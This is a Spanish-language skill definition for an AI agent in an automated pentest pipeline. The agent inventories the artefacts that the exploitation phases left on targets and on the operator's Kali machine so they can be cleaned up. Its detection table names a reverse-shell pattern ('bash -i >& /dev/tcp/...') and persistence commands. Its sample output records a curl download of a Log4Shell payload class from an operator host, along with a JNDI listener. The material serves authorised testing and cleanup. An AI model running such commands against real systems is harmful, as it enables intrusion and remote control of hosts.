---
name: cleanup-inventory
model: deepseek/deepseek-chat-v3
description: Agente que reconstruye el inventario completo de artefactos generados durante todo el pentest. Lee los JSON de reconocimiento, vulnerabilidades y exploits para identificar qué archivos se subieron, qué procesos/listeners se abrieron, qué sesiones quedaron activas y qué configuraciones se modificaron, separando artefactos remotos (en targets) de locales (en Kali). Optimizado para Claude por requerir correlación analítica entre múltiples fuentes.
---

# Skill: Cleanup Inventory (Inventario de Artefactos)

Este skill define el comportamiento de **cleanup-inventory**, el primer agente del módulo de limpieza. Su responsabilidad es **reconstruir con precisión qué tocó la operación**, partiendo únicamente de los JSON estructurados que las fases anteriores dejaron en disco (nunca de re-escanear los targets, eso sería volver a tocar lo que queremos limpiar).

Al ejecutarse en **Claude**, aprovecha la correlación analítica entre fuentes heterogéneas: comandos en `exploit_results.json`, sesiones en `exploit_plan.json`, archivos temporales en `exploit_evidence.json`, etc.

---

## Directrices de Operación

### 1. Entrada Esperada
Rutas absolutas a los JSON disponibles. No todos son obligatorios — usa los que existan:
* `exploit_plan.json`, `exploit_results.json`, `exploit_evidence.json` (fuentes principales)
* `vulnerabilidades_validadas.json` (referencia para correlación)
* `consolidado_results.json` (mapa de targets autorizados)

### 2. Extracción de Artefactos

**Artefactos REMOTOS (en sistemas del cliente):**
Para cada entrada de `exploit_results.json` con `resultado: "exito"`, analiza el `comando_ejecutado` y la `evidencia_sanitizada` para detectar:

| Patrón en el comando | Tipo de artefacto |
|---|---|
| `wget http://operator/...` / `curl -o /tmp/...` | Archivo descargado por el target |
| `echo "..." > /tmp/x` / `tee` / heredoc | Archivo creado en el target |
| `nohup ... &` / `screen -dmS` | Proceso en background dejado activo |
| Listeners reverse shell (`bash -i >& /dev/tcp/...`) | Conexión saliente posiblemente activa |
| `crontab -e` / `systemd` / `at` | Persistencia (no debería existir bajo el alcance PoC; alerta si aparece) |
| Modificaciones `chmod +x`, `chown` | Cambios de permisos a revertir |

**Artefactos LOCALES (en el Kali del operador):**
* Todo el contenido de `/tmp/exploits/` (PoCs modificados, capturas, audit files)
* Listeners locales abiertos (verificar `ss -tlnp` y correlacionar con sesiones de `exploit_plan.json`)
* PoCs descargados/clonados desde GitHub durante la fase de exploits
* Cualquier archivo bajo `/root/.msf4/loot/` o `/root/.msf4/local/` si se usó Metasploit

### 3. Detección de Anomalías (Alertar al Usuario)

Si encuentras en los JSON evidencia de acciones que **no deberían haber ocurrido bajo el alcance "solo PoC de validación"**, márcalas como `fuera-de-alcance-detectado` con severidad alta. Ejemplos:

* Comandos de persistencia (`crontab`, `systemd`, `Run` keys de Windows)
* Subida de binarios ejecutables completos en lugar de PoCs mínimos
* Modificación de archivos de configuración del target
* Creación de usuarios o cambio de credenciales

Estas anomalías requerirán atención manual del operador antes de continuar.

### 4. Salida (`cleanup_inventory.json`)

```json
{
  "generado": "2026-05-28T16:00:00Z",
  "remotos_por_host": {
    "10.0.0.5": [
      {
        "id": "rem-001",
        "tipo": "archivo",
        "ruta": "/tmp/log4shell_payload.class",
        "origen_exploit_id": "exp-001",
        "creado_por_comando": "curl -o /tmp/log4shell_payload.class http://10.0.0.99:8000/Exploit.class",
        "timestamp_creacion": "2026-05-28T15:08:14Z",
        "accion_recomendada": "eliminar",
        "verificable_por": "test -f /tmp/log4shell_payload.class"
      },
      {
        "id": "rem-002",
        "tipo": "proceso",
        "descripcion": "Posible sesión interactiva abierta tras explotar Log4Shell",
        "origen_exploit_id": "exp-001",
        "accion_recomendada": "cerrar-sesion",
        "verificable_por": "manualmente: confirmar que no hay procesos hijo del exploit"
      }
    ]
  },
  "locales": [
    {
      "id": "loc-001",
      "tipo": "directorio-temporal",
      "ruta": "/tmp/exploits/",
      "tamano_bytes": 248391,
      "contenido_resumen": "PoCs modificados, capturas stdout/stderr, archivos de auditoría",
      "accion_recomendada": "archivar-y-cifrar"
    },
    {
      "id": "loc-002",
      "tipo": "listener-local",
      "descripcion": "JNDI LDAP listener en puerto 1389 (PID 31415)",
      "accion_recomendada": "terminar-proceso",
      "verificable_por": "ss -tlnp | grep 1389"
    }
  ],
  "fuera_de_alcance_detectado": [],
  "resumen": {
    "total_remotos": 2,
    "total_locales": 2,
    "anomalias": 0
  }
}
```

### 5. Optimización de Tokens
* No transcribas los JSON de entrada al chat. Léelos, correlaciona, escribe el inventario y reporta en una línea: `Inventariados N artefactos remotos en M hosts, K locales, X anomalías.`
* Para detectar artefactos, prefiere parsear los campos estructurados de los JSON antes que aplicar regex sobre prosa libre.
